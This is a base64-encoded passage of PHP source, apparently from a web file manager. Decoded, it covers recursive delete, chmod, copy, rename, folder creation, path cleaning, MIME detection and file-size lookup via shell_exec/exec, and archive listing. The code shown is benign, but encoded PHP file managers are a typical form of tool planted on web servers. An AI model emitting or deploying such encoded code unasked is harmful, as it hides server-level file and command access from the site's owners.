JG9rID0gdHJ1ZTsNCiAgICAgICAgaWYgKGlzX2FycmF5KCRvYmplY3RzKSkgew0KICAgICAgICAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJGZpbGUpIHsNCiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCFmbV9yZGVsZXRlKCRwYXRoIC4gJy8nIC4gJGZpbGUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkb2sgPSBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gKCRvaykgPyBybWRpcigkcGF0aCkgOiBmYWxzZTsNCiAgICB9IGVsc2VpZiAoaXNfZmlsZSgkcGF0aCkpIHsNCiAgICAgICAgcmV0dXJuIHVubGluaygkcGF0aCk7DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCg0KLyoqDQogKiBSZWN1cnNpdmUgY2htb2QNCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgNCiAqIEBwYXJhbSBpbnQgJGZpbGVtb2RlDQogKiBAcGFyYW0gaW50ICRkaXJtb2RlDQogKiBAcmV0dXJuIGJvb2wNCiAqIEB0b2RvIFdpbGwgdXNlIGluIG1hc3MgY2htb2QNCiAqLw0KZnVuY3Rpb24gZm1fcmNobW9kKCRwYXRoLCAkZmlsZW1vZGUsICRkaXJtb2RlKQ0Kew0KICAgIGlmIChpc19kaXIoJHBhdGgpKSB7DQogICAgICAgIGlmICghY2htb2QoJHBhdGgsICRkaXJtb2RlKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7DQogICAgICAgIGlmIChpc19hcnJheSgkb2JqZWN0cykpIHsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7DQogICAgICAgICAgICAgICAgaWYgKCRmaWxlICE9ICcuJyAmJiAkZmlsZSAhPSAnLi4nKSB7DQogICAgICAgICAgICAgICAgICAgIGlmICghZm1fcmNobW9kKCRwYXRoIC4gJy8nIC4gJGZpbGUsICRmaWxlbW9kZSwgJGRpcm1vZGUpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfSBlbHNlaWYgKGlzX2xpbmsoJHBhdGgpKSB7DQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0gZWxzZWlmIChpc19maWxlKCRwYXRoKSkgew0KICAgICAgICByZXR1cm4gY2htb2QoJHBhdGgsICRmaWxlbW9kZSk7DQogICAgfQ0KICAgIHJldHVybiBmYWxzZTsNCn0NCg0KLyoqDQogKiBDaGVjayB0aGUgZmlsZSBleHRlbnNpb24gd2hpY2ggaXMgYWxsb3dlZCBvciBub3QNCiAqIEBwYXJhbSBzdHJpbmcgJGZpbGVuYW1lDQogKiBAcmV0dXJuIGJvb2wNCiAqLw0KZnVuY3Rpb24gZm1faXNfdmFsaWRfZXh0KCRmaWxlbmFtZSkNCnsNCiAgICAkYWxsb3dlZCA9IChGTV9GSUxFX0VYVEVOU0lPTikgPyBleHBsb2RlKCcsJywgRk1fRklMRV9FWFRFTlNJT04pIDogZmFsc2U7DQoNCiAgICAkZXh0ID0gcGF0aGluZm8oJGZpbGVuYW1lLCBQQVRISU5GT19FWFRFTlNJT04pOw0KICAgICRpc0ZpbGVBbGxvd2VkID0gKCRhbGxvd2VkKSA/IGluX2FycmF5KCRleHQsICRhbGxvd2VkKSA6IHRydWU7DQoNCiAgICByZXR1cm4gKCRpc0ZpbGVBbGxvd2VkKSA/IHRydWUgOiBmYWxzZTsNCn0NCg0KLyoqDQogKiBTYWZlbHkgcmVuYW1lDQogKiBAcGFyYW0gc3RyaW5nICRvbGQNCiAqIEBwYXJhbSBzdHJpbmcgJG5ldw0KICogQHJldHVybiBib29sfG51bGwNCiAqLw0KZnVuY3Rpb24gZm1fcmVuYW1lKCRvbGQsICRuZXcpDQp7DQogICAgJGlzRmlsZUFsbG93ZWQgPSBmbV9pc192YWxpZF9leHQoJG5ldyk7DQoNCiAgICBpZiAoIWlzX2Rpcigkb2xkKSkgew0KICAgICAgICBpZiAoISRpc0ZpbGVBbGxvd2VkKSByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgcmV0dXJuICghZmlsZV9leGlzdHMoJG5ldykgJiYgZmlsZV9leGlzdHMoJG9sZCkpID8gcmVuYW1lKCRvbGQsICRuZXcpIDogbnVsbDsNCn0NCg0KLyoqDQogKiBDb3B5IGZpbGUgb3IgZm9sZGVyIChyZWN1cnNpdmVseSkuDQogKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogKiBAcGFyYW0gc3RyaW5nICRkZXN0DQogKiBAcGFyYW0gYm9vbCAkdXBkIFVwZGF0ZSBmaWxlcw0KICogQHBhcmFtIGJvb2wgJGZvcmNlIENyZWF0ZSBmb2xkZXIgd2l0aCBzYW1lIG5hbWVzIGluc3RlYWQgZmlsZQ0KICogQHJldHVybiBib29sDQogKi8NCmZ1bmN0aW9uIGZtX3Jjb3B5KCRwYXRoLCAkZGVzdCwgJHVwZCA9IHRydWUsICRmb3JjZSA9IHRydWUpDQp7DQogICAgaWYgKCFpc19kaXIoJHBhdGgpICYmICFpc19maWxlKCRwYXRoKSkgew0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgaWYgKGlzX2RpcigkcGF0aCkpIHsNCiAgICAgICAgaWYgKCFmbV9ta2RpcigkZGVzdCwgJGZvcmNlKSkgew0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQoNCiAgICAgICAgJG9iamVjdHMgPSBhcnJheV9kaWZmKHNjYW5kaXIoJHBhdGgpLCBbJy4nLCAnLi4nXSk7DQoNCiAgICAgICAgZm9yZWFjaCAoJG9iamVjdHMgYXMgJGZpbGUpIHsNCiAgICAgICAgICAgIGlmICghZm1fcmNvcHkoIiRwYXRoLyRmaWxlIiwgIiRkZXN0LyRmaWxlIiwgJHVwZCwgJGZvcmNlKSkgew0KICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCg0KICAgIC8vIEhhbmRsZSBmaWxlIGNvcHlpbmcNCiAgICByZXR1cm4gZm1fY29weSgkcGF0aCwgJGRlc3QsICR1cGQpOw0KfQ0KDQoNCi8qKg0KICogU2FmZWx5IGNyZWF0ZSBmb2xkZXINCiAqIEBwYXJhbSBzdHJpbmcgJGRpcg0KICogQHBhcmFtIGJvb2wgJGZvcmNlDQogKiBAcmV0dXJuIGJvb2wNCiAqLw0KZnVuY3Rpb24gZm1fbWtkaXIoJGRpciwgJGZvcmNlKQ0Kew0KICAgIGlmIChmaWxlX2V4aXN0cygkZGlyKSkgew0KICAgICAgICBpZiAoaXNfZGlyKCRkaXIpKSB7DQogICAgICAgICAgICByZXR1cm4gJGRpcjsNCiAgICAgICAgfSBlbHNlaWYgKCEkZm9yY2UpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICB1bmxpbmsoJGRpcik7DQogICAgfQ0KICAgIHJldHVybiBta2RpcigkZGlyLCAwNzc3LCB0cnVlKTsNCn0NCg0KLyoqDQogKiBTYWZlbHkgY29weSBmaWxlDQogKiBAcGFyYW0gc3RyaW5nICRmMQ0KICogQHBhcmFtIHN0cmluZyAkZjINCiAqIEBwYXJhbSBib29sICR1cGQgSW5kaWNhdGVzIGlmIGZpbGUgc2hvdWxkIGJlIHVwZGF0ZWQgd2l0aCBuZXcgY29udGVudA0KICogQHJldHVybiBib29sDQogKi8NCmZ1bmN0aW9uIGZtX2NvcHkoJGYxLCAkZjIsICR1cGQpDQp7DQogICAgJHRpbWUxID0gZmlsZW10aW1lKCRmMSk7DQogICAgaWYgKGZpbGVfZXhpc3RzKCRmMikpIHsNCiAgICAgICAgJHRpbWUyID0gZmlsZW10aW1lKCRmMik7DQogICAgICAgIGlmICgkdGltZTIgPj0gJHRpbWUxICYmICR1cGQpIHsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICAkb2sgPSBjb3B5KCRmMSwgJGYyKTsNCiAgICBpZiAoJG9rKSB7DQogICAgICAgIHRvdWNoKCRmMiwgJHRpbWUxKTsNCiAgICB9DQogICAgcmV0dXJuICRvazsNCn0NCg0KLyoqDQogKiBHZXQgbWltZSB0eXBlDQogKiBAcGFyYW0gc3RyaW5nICRmaWxlX3BhdGgNCiAqIEByZXR1cm4gbWl4ZWR8c3RyaW5nDQogKi8NCmZ1bmN0aW9uIGZtX2dldF9taW1lX3R5cGUoJGZpbGVfcGF0aCkNCnsNCiAgICBpZiAoZnVuY3Rpb25fZXhpc3RzKCdmaW5mb19vcGVuJykpIHsNCiAgICAgICAgJGZpbmZvID0gZmluZm9fb3BlbihGSUxFSU5GT19NSU1FX1RZUEUpOw0KICAgICAgICAkbWltZSA9IGZpbmZvX2ZpbGUoJGZpbmZvLCAkZmlsZV9wYXRoKTsNCiAgICAgICAgZmluZm9fY2xvc2UoJGZpbmZvKTsNCiAgICAgICAgcmV0dXJuICRtaW1lOw0KICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ21pbWVfY29udGVudF90eXBlJykpIHsNCiAgICAgICAgcmV0dXJuIG1pbWVfY29udGVudF90eXBlKCRmaWxlX3BhdGgpOw0KICAgIH0gZWxzZWlmICghc3RyaXN0cihpbmlfZ2V0KCdkaXNhYmxlX2Z1bmN0aW9ucycpLCAnc2hlbGxfZXhlYycpKSB7DQogICAgICAgICRmaWxlID0gZXNjYXBlc2hlbGxhcmcoJGZpbGVfcGF0aCk7DQogICAgICAgICRtaW1lID0gc2hlbGxfZXhlYygnZmlsZSAtYmkgJyAuICRmaWxlKTsNCiAgICAgICAgcmV0dXJuICRtaW1lOw0KICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybiAnLS0nOw0KICAgIH0NCn0NCg0KLyoqDQogKiBIVFRQIFJlZGlyZWN0DQogKiBAcGFyYW0gc3RyaW5nICR1cmwNCiAqIEBwYXJhbSBpbnQgJGNvZGUNCiAqLw0KZnVuY3Rpb24gZm1fcmVkaXJlY3QoJHVybCwgJGNvZGUgPSAzMDIpDQp7DQogICAgaGVhZGVyKCdMb2NhdGlvbjogJyAuICR1cmwsIHRydWUsICRjb2RlKTsNCiAgICBleGl0Ow0KfQ0KDQovKioNCiAqIFBhdGggdHJhdmVyc2FsIHByZXZlbnRpb24gYW5kIGNsZWFuIHRoZSB1cmwNCiAqIEl0IHJlcGxhY2VzIChjb25zZWN1dGl2ZSkgb2NjdXJyZW5jZXMgb2YgLyBhbmQgXFwgd2l0aCB3aGF0ZXZlciBpcyBpbiBESVJFQ1RPUllfU0VQQVJBVE9SLCBhbmQgcHJvY2Vzc2VzIC8uIGFuZCAvLi4gZmluZS4NCiAqIEBwYXJhbSAkcGF0aA0KICogQHJldHVybiBzdHJpbmcNCiAqLw0KZnVuY3Rpb24gZ2V0X2Fic29sdXRlX3BhdGgoJHBhdGgpDQp7DQogICAgJHBhdGggPSBzdHJfcmVwbGFjZShhcnJheSgnLycsICdcXCcpLCBESVJFQ1RPUllfU0VQQVJBVE9SLCAkcGF0aCk7DQogICAgJHBhcnRzID0gYXJyYXlfZmlsdGVyKGV4cGxvZGUoRElSRUNUT1JZX1NFUEFSQVRPUiwgJHBhdGgpLCAnc3RybGVuJyk7DQogICAgJGFic29sdXRlcyA9IGFycmF5KCk7DQogICAgZm9yZWFjaCAoJHBhcnRzIGFzICRwYXJ0KSB7DQogICAgICAgIGlmICgnLicgPT0gJHBhcnQpIGNvbnRpbnVlOw0KICAgICAgICBpZiAoJy4uJyA9PSAkcGFydCkgew0KICAgICAgICAgICAgYXJyYXlfcG9wKCRhYnNvbHV0ZXMpOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJGFic29sdXRlc1tdID0gJHBhcnQ7DQogICAgICAgIH0NCiAgICB9DQogICAgcmV0dXJuIGltcGxvZGUoRElSRUNUT1JZX1NFUEFSQVRPUiwgJGFic29sdXRlcyk7DQp9DQoNCi8qKg0KICogQ2xlYW4gcGF0aA0KICogQHBhcmFtIHN0cmluZyAkcGF0aA0KICogQHJldHVybiBzdHJpbmcNCiAqLw0KZnVuY3Rpb24gZm1fY2xlYW5fcGF0aCgkcGF0aCwgJHRyaW0gPSB0cnVlKQ0Kew0KICAgICRwYXRoID0gJHRyaW0gPyB0cmltKCRwYXRoKSA6ICRwYXRoOw0KICAgICRwYXRoID0gdHJpbSgkcGF0aCwgJ1xcLycpOw0KICAgICRwYXRoID0gc3RyX3JlcGxhY2UoYXJyYXkoJy4uLycsICcuLlxcJyksICcnLCAkcGF0aCk7DQogICAgJHBhdGggPSAgZ2V0X2Fic29sdXRlX3BhdGgoJHBhdGgpOw0KICAgIGlmICgkcGF0aCA9PSAnLi4nKSB7DQogICAgICAgICRwYXRoID0gJyc7DQogICAgfQ0KICAgIHJldHVybiBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRwYXRoKTsNCn0NCg0KLyoqDQogKiBHZXQgcGFyZW50IHBhdGgNCiAqIEBwYXJhbSBzdHJpbmcgJHBhdGgNCiAqIEByZXR1cm4gYm9vbHxzdHJpbmcNCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X3BhcmVudF9wYXRoKCRwYXRoKQ0Kew0KICAgICRwYXRoID0gZm1fY2xlYW5fcGF0aCgkcGF0aCk7DQogICAgaWYgKCRwYXRoICE9ICcnKSB7DQogICAgICAgICRhcnJheSA9IGV4cGxvZGUoJy8nLCAkcGF0aCk7DQogICAgICAgIGlmIChjb3VudCgkYXJyYXkpID4gMSkgew0KICAgICAgICAgICAgJGFycmF5ID0gYXJyYXlfc2xpY2UoJGFycmF5LCAwLCAtMSk7DQogICAgICAgICAgICByZXR1cm4gaW1wbG9kZSgnLycsICRhcnJheSk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICcnOw0KICAgIH0NCiAgICByZXR1cm4gZmFsc2U7DQp9DQoNCmZ1bmN0aW9uIGZtX2dldF9kaXNwbGF5X3BhdGgoJGZpbGVfcGF0aCkNCnsNCiAgICBnbG9iYWwgJHBhdGhfZGlzcGxheV9tb2RlLCAkcm9vdF9wYXRoLCAkcm9vdF91cmw7DQogICAgc3dpdGNoICgkcGF0aF9kaXNwbGF5X21vZGUpIHsNCiAgICAgICAgY2FzZSAncmVsYXRpdmUnOg0KICAgICAgICAgICAgcmV0dXJuIGFycmF5KA0KICAgICAgICAgICAgICAgICdsYWJlbCcgPT4gJ1BhdGgnLA0KICAgICAgICAgICAgICAgICdwYXRoJyA9PiBmbV9lbmMoZm1fY29udmVydF93aW4oc3RyX3JlcGxhY2UoJHJvb3RfcGF0aCwgJycsICRmaWxlX3BhdGgpKSkNCiAgICAgICAgICAgICk7DQogICAgICAgIGNhc2UgJ2hvc3QnOg0KICAgICAgICAgICAgJHJlbGF0aXZlX3BhdGggPSBzdHJfcmVwbGFjZSgkcm9vdF9wYXRoLCAnJywgJGZpbGVfcGF0aCk7DQogICAgICAgICAgICByZXR1cm4gYXJyYXkoDQogICAgICAgICAgICAgICAgJ2xhYmVsJyA9PiAnSG9zdCBQYXRoJywNCiAgICAgICAgICAgICAgICAncGF0aCcgPT4gZm1fZW5jKGZtX2NvbnZlcnRfd2luKCcvJyAuICRyb290X3VybCAuICcvJyAuIGx0cmltKHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJHJlbGF0aXZlX3BhdGgpLCAnLycpKSkNCiAgICAgICAgICAgICk7DQogICAgICAgIGNhc2UgJ2Z1bGwnOg0KICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgcmV0dXJuIGFycmF5KA0KICAgICAgICAgICAgICAgICdsYWJlbCcgPT4gJ0Z1bGwgUGF0aCcsDQogICAgICAgICAgICAgICAgJ3BhdGgnID0+IGZtX2VuYyhmbV9jb252ZXJ0X3dpbigkZmlsZV9wYXRoKSkNCiAgICAgICAgICAgICk7DQogICAgfQ0KfQ0KDQovKioNCiAqIENoZWNrIGZpbGUgaXMgaW4gZXhjbHVkZSBsaXN0DQogKiBAcGFyYW0gc3RyaW5nICRmaWxlDQogKiBAcmV0dXJuIGJvb2wNCiAqLw0KZnVuY3Rpb24gZm1faXNfZXhjbHVkZV9pdGVtcygkZmlsZSkNCnsNCiAgICAkZXh0ID0gc3RydG9sb3dlcihwYXRoaW5mbygkZmlsZSwgUEFUSElORk9fRVhURU5TSU9OKSk7DQogICAgaWYgKGlzc2V0KCRleGNsdWRlX2l0ZW1zKSBhbmQgc2l6ZW9mKCRleGNsdWRlX2l0ZW1zKSkgew0KICAgICAgICB1bnNldCgkZXhjbHVkZV9pdGVtcyk7DQogICAgfQ0KDQogICAgJGV4Y2x1ZGVfaXRlbXMgPSBGTV9FWENMVURFX0lURU1TOw0KICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUEhQX1ZFUlNJT04sICc3LjAuMCcsICc8JykpIHsNCiAgICAgICAgJGV4Y2x1ZGVfaXRlbXMgPSB1bnNlcmlhbGl6ZSgkZXhjbHVkZV9pdGVtcyk7DQogICAgfQ0KICAgIGlmICghaW5fYXJyYXkoJGZpbGUsICRleGNsdWRlX2l0ZW1zKSAmJiAhaW5fYXJyYXkoIiouJGV4dCIsICRleGNsdWRlX2l0ZW1zKSkgew0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovKioNCiAqIGdldCBsYW5ndWFnZSB0cmFuc2xhdGlvbnMgZnJvbSBqc29uIGZpbGUNCiAqIEBwYXJhbSBpbnQgJHRyDQogKiBAcmV0dXJuIGFycmF5DQogKi8NCmZ1bmN0aW9uIGZtX2dldF90cmFuc2xhdGlvbnMoJHRyKQ0Kew0KICAgIHRyeSB7DQogICAgICAgICRjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCd0cmFuc2xhdGlvbi5qc29uJyk7DQogICAgICAgIGlmICgkY29udGVudCAhPT0gRkFMU0UpIHsNCiAgICAgICAgICAgICRsbmcgPSBqc29uX2RlY29kZSgkY29udGVudCwgVFJVRSk7DQogICAgICAgICAgICBnbG9iYWwgJGxhbmdfbGlzdDsNCiAgICAgICAgICAgIGZvcmVhY2ggKCRsbmdbImxhbmd1YWdlIl0gYXMgJGtleSA9PiAkdmFsdWUpIHsNCiAgICAgICAgICAgICAgICAkY29kZSA9ICR2YWx1ZVsiY29kZSJdOw0KICAgICAgICAgICAgICAgICRsYW5nX2xpc3RbJGNvZGVdID0gJHZhbHVlWyJuYW1lIl07DQogICAgICAgICAgICAgICAgaWYgKCR0cikNCiAgICAgICAgICAgICAgICAgICAgJHRyWyRjb2RlXSA9ICR2YWx1ZVsidHJhbnNsYXRpb24iXTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiAkdHI7DQogICAgICAgIH0NCiAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgZWNobyAkZTsNCiAgICB9DQp9DQoNCi8qKg0KICogQHBhcmFtIHN0cmluZyAkZmlsZQ0KICogUmVjb3ZlciBhbGwgZmlsZSBzaXplcyBsYXJnZXIgdGhhbiA+IDJHQi4NCiAqIFdvcmtzIG9uIHBocCAzMmJpdHMgYW5kIDY0Yml0cyBhbmQgc3VwcG9ydHMgbGludXgNCiAqIEByZXR1cm4gaW50fHN0cmluZw0KICovDQpmdW5jdGlvbiBmbV9nZXRfc2l6ZSgkZmlsZSkNCnsNCiAgICBzdGF0aWMgJGlzd2luID0gbnVsbDsNCiAgICBzdGF0aWMgJGlzZGFyd2luID0gbnVsbDsNCiAgICBzdGF0aWMgJGV4ZWNfd29ya3MgPSBudWxsOw0KDQogICAgLy8gU2V0IHN0YXRpYyB2YXJpYWJsZXMgb25jZQ0KICAgIGlmICgkaXN3aW4gPT09IG51bGwpIHsNCiAgICAgICAgJGlzd2luID0gc3RydG91cHBlcihzdWJzdHIoUEhQX09TLCAwLCAzKSkgPT09ICdXSU4nOw0KICAgICAgICAkaXNkYXJ3aW4gPSBzdHJ0b3VwcGVyKFBIUF9PUykgPT09ICdEQVJXSU4nOw0KICAgICAgICAkZXhlY193b3JrcyA9IGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpICYmICFpbmlfZ2V0KCdzYWZlX21vZGUnKSAmJiBAZXhlYygnZWNobyBFWEVDJykgPT09ICdFWEVDJzsNCiAgICB9DQoNCiAgICAvLyBBdHRlbXB0IHNoZWxsIGNvbW1hbmQgaWYgZXhlYyBpcyBhdmFpbGFibGUNCiAgICBpZiAoJGV4ZWNfd29ya3MpIHsNCiAgICAgICAgJGFyZyA9IGVzY2FwZXNoZWxsYXJnKCRmaWxlKTsNCiAgICAgICAgJGNtZCA9ICRpc3dpbiA/ICJmb3IgJUYgaW4gKFwiJGZpbGVcIikgZG8gQGVjaG8gJX56RiIgOiAoJGlzZGFyd2luID8gInN0YXQgLWYleiAkYXJnIiA6ICJzdGF0IC1jJXMgJGFyZyIpOw0KICAgICAgICBAZXhlYygkY21kLCAkb3V0cHV0KTsNCg0KICAgICAgICBpZiAoIWVtcHR5KCRvdXRwdXQpICYmIGN0eXBlX2RpZ2l0KCRzaXplID0gdHJpbShpbXBsb2RlKCJcbiIsICRvdXRwdXQpKSkpIHsNCiAgICAgICAgICAgIHJldHVybiAkc2l6ZTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8vIEF0dGVtcHQgV2luZG93cyBDT00gaW50ZXJmYWNlIGZvciBXaW5kb3dzIHN5c3RlbXMNCiAgICBpZiAoJGlzd2luICYmIGNsYXNzX2V4aXN0cygnQ09NJykpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRmc29iaiA9IG5ldyBDT00oJ1NjcmlwdGluZy5GaWxlU3lzdGVtT2JqZWN0Jyk7DQogICAgICAgICAgICAkZiA9ICRmc29iai0+R2V0RmlsZShyZWFscGF0aCgkZmlsZSkpOw0KICAgICAgICAgICAgaWYgKGN0eXBlX2RpZ2l0KCRzaXplID0gJGYtPlNpemUpKSB7DQogICAgICAgICAgICAgICAgcmV0dXJuICRzaXplOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9IGNhdGNoIChFeGNlcHRpb24gJGUpIHsNCiAgICAgICAgICAgIC8vIENPTSBmYWlsZWQsIGZhbGxiYWNrIHRvIGZpbGVzaXplDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvLyBEZWZhdWx0IHRvIFBIUCdzIGZpbGVzaXplIGZ1bmN0aW9uDQogICAgcmV0dXJuIGZpbGVzaXplKCRmaWxlKTsNCn0NCg0KDQovKioNCiAqIEdldCBuaWNlIGZpbGVzaXplDQogKiBAcGFyYW0gaW50ICRzaXplDQogKiBAcmV0dXJuIHN0cmluZw0KICovDQpmdW5jdGlvbiBmbV9nZXRfZmlsZXNpemUoJHNpemUpDQp7DQogICAgJHNpemUgPSAoZmxvYXQpICRzaXplOw0KICAgICR1bml0cyA9IGFycmF5KCdCJywgJ0tCJywgJ01CJywgJ0dCJywgJ1RCJywgJ1BCJywgJ0VCJywgJ1pCJywgJ1lCJyk7DQogICAgJHBvd2VyID0gKCRzaXplID4gMCkgPyBmbG9vcihsb2coJHNpemUsIDEwMjQpKSA6IDA7DQogICAgJHBvd2VyID0gKCRwb3dlciA+IChjb3VudCgkdW5pdHMpIC0gMSkpID8gKGNvdW50KCR1bml0cykgLSAxKSA6ICRwb3dlcjsNCiAgICByZXR1cm4gc3ByaW50ZignJXMgJXMnLCByb3VuZCgkc2l6ZSAvIHBvdygxMDI0LCAkcG93ZXIpLCAyKSwgJHVuaXRzWyRwb3dlcl0pOw0KfQ0KDQovKioNCiAqIEdldCBpbmZvIGFib3V0IHppcCBhcmNoaXZlDQogKiBAcGFyYW0gc3RyaW5nICRwYXRoDQogKiBAcmV0dXJuIGFycmF5fGJvb2wNCiAqLw0KZnVuY3Rpb24gZm1fZ2V0X3ppZl9pbmZvKCRwYXRoLCAkZXh0KQ0Kew0KICAgIGlmICgkZXh0ID09ICd6aXAnICYmIGZ1bmN0aW9uX2V4aXN0cygnemlwX29wZW4nKSkgew0KICAgICAgICAkYXJjaCA9IEB6aXBfb3BlbigkcGF0aCk7DQogICAgICAgIGlmICgkYXJjaCkgew0KICAgICAgICAgICAgJGZpbGVuYW1lcyA9IGFycmF5KCk7DQogICAgICAgICAgICB3aGlsZSAoJHppcF9lbnRyeSA9IEB6aXBfcmVhZCgkYXJjaCkpIHsNCiAgICAgICAgICAgICAgICAkemlwX25hbWUgPSBAemlwX2VudHJ5X25hbWUoJHppcF9lbnRyeSk7DQogICAgICAgICAgICAgICAgJHppcF9mb2xkZXIgPSBzdWJzdHIoJHppcF9uYW1lLCAtMSkgPT0gJy8nOw0KICAgICAgICAgICAgICAgICRmaWxlbmFtZXNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gJHppcF9uYW1lLA0KICAgICAgICAgICAgICAgICAgICAnZmlsZXNpemUnID0+IEB6aXBfZW50cnlfZmlsZXNpemUoJHppcF9lbnRyeSksDQogICAgICAgICAgICAgICAgICAgICdjb21wcmVzc2VkX3NpemUnID0+IEB6aXBfZW50cnlfY29tcHJlc3NlZHNpemUoJHppcF9lbnRyeSksDQogICAgICAgICAgICAgICAgICAgICdmb2xkZXInID0+ICR6aXBfZm9sZGVyDQogICAgICAgICAgICAgICAgICAgIC8vJ2NvbXByZXNzaW9uX21ldGhvZCcgPT4gemlwX2VudHJ5X2NvbXByZXNzaW9ubWV0aG9kKCR6aXBfZW50cnkpLA0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBAemlwX2Nsb3NlKCRhcmNoKTsNCiAgICAgICAgICAgIHJldHVybiAkZmlsZW5hbWVzOw0KICAgICAgICB9DQogICAgfSBlbHNlaWYgKCRleHQgPT0gJ3RhcicgJiYgY2xhc3NfZXhpc3RzKCdQaGFyRGF0YScpKSB7DQogICAgICAgICRhcmNoaXZlID0gbmV3IFBoYXJEYXRhKCRwYXRoKTsNCiAgICAgICAgJGZpbGVuYW1lcyA9IGFycmF5KCk7DQogICAgICAgIGZvcmVhY2ggKG5ldyBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yKCRhcmNoaXZlKSBhcyAkZmlsZSkgew0KICAgICAgICAgICAgJHBhcmVudF9pbmZvID0gJGZpbGUtPmdldFBhdGhJbmZvKCk7DQogICAgICAgICAgICAkemlwX25hbWUgPSBzdHJfcmVwbGFjZSgicGhhcjovLyIgLiAkcGF0aCwgJycsICRmaWxlLT5nZXRQYXRoTmFtZSgpKTsNCiAgICAgICAgICAgICR6aXBfbmFtZSA9IHN1YnN0cigkemlwX25hbWUsICgkcG9zID0gc3RycG9zKCR6aXBfbmFtZSwgJy8nKSkgIT09IGZhbHNlID8gJHBvcyArIDEgOiAwKTsNCiAgICAgICAgICAgICR6aXBfZm9sZGVyID0gJHBhcmVudF9pbmZvLT5nZXRGaWxlTmFtZSgpOw0KICAgICAgICAgICAgJHppcF9pbmZvID0gbmV3IFNwbEZpbGVJbmZvKCRmaWxlKTsNCiAgICAgICAgICAgICRmaWxlbmFtZXNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICduYW1lJyA9PiAkemlwX25hbWUsDQogICAgICAgICAgICAgICAgJ2ZpbGVzaXplJyA9PiAkemlwX2luZm8tPmdldFNpemUoKSwNCiAgICAgICAgICAgICAgICAnY29tcHJlc3NlZF9zaXplJyA9PiAkZmlsZS0+Z2V0Q29tcHJlc3NlZFNpemUoKSwNCiAgICAgICAgICAgICAgICAnZm9sZGVyJyA9PiAkemlwX2ZvbGRlcg0KICAgICAgICAgICAgKTsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gJGZpbGVuYW1lczsNCiAgICB9DQogICAgcmV0dXJuIGZhbHNlOw0KfQ0KDQovKioNCiAqIEVuY29kZSBodG1sIGVudGl0aWVzDQogKiBAcGFyYW0gc3RyaW5nICR0ZXh0DQogKiBAcmV0dXJuIHN0cmluZw0KICovDQpmdW5jdGlvbiBmbV9lbmMoJHRleHQpDQp7DQogICAgcmV0dXJuIGh0bWxzcGVjaWFsY2hhcnMoJHRleHQsIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KfQ0KDQovKioNCiAqIFByZXZlbnQgWFNTIGF0dGFja3MNCiAqIEBwYXJhbSBzdHJpbmcgJHRleHQNCiAqIEByZXR1cm4gc3RyaW5nDQogKi8NCmZ1bmN0aW9uIGZtX2lzdmFsaWRfZmlsZW5hbWUoJHRleHQpDQp7DQogICAgcmV0dXJuIChzdHJwYnJrKCR0ZXh0LCAnLz8lKjp8Ijw+JykgPT09IEZBTFNFKSA/IHRydWUgOiBmYWxzZTsNCn0NCg0KLyoqDQogKiBTYXZlIG1lc3NhZ2UgaW4gc2Vzc2lvbg0KICogQHBhcmFtIHN0cmluZyAkbXNnDQogKiBAcGFyYW0gc3RyaW5nICRzdGF0dXMNCiAqLw0KZnVuY3Rp